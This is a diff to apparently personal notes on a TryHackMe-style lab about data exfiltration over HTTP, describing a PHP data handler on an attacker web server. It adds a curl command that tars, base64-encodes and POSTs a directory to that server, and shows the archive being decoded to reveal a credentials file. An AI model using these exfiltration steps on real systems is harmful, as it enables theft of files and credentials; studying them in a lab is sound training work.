@@ -49,12 +49,12 @@ thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
 
 ### Exfiltrate using HTTP(S)
 #### HTTP Data Exfiltration
-1. An attacker sets up a web server with a data handler. In our case, it will be web.thm.com and the contact.php page as a data handler.
-2. A C2 agent or an attacker sends the data. In our case, we will send data using the curl command.
-3. The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
+1. An attacker sets up a web server with a data handler. In our case, it will be `web.thm.com` and the `contact.php` page as a data handler.
+2. A C2 agent or an attacker sends the data. In our case, we will send data using the `curl` command.
+3. The webserver receives the data and stores it. In our case, the `contact.php` receives the POST request and stores it into `/tmp`.
 4. The attacker logs into the webserver to have a copy of the received data.  
 
-First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.   
+First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the `/tmp` directory as `http.bs64` file name.   
 
 ```
 <?php 
@@ -66,3 +66,24 @@ if (isset($_POST['file'])) {
 ?>
 ```  
 
+- Sending POST data via CURL
+```
+thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
+```
+- Checking the received data and fix it
+```
+thm@web:~$ ls -l /tmp/
+total 4
+-rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64
+thm@web:~$ cat /tmp/http.bs64
+H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD<
+WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3
+On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
+5gZKZxgrACgAAA==
+
+thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
+
+thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
+tmp/task6/
+tmp/task6/creds.txt
+```
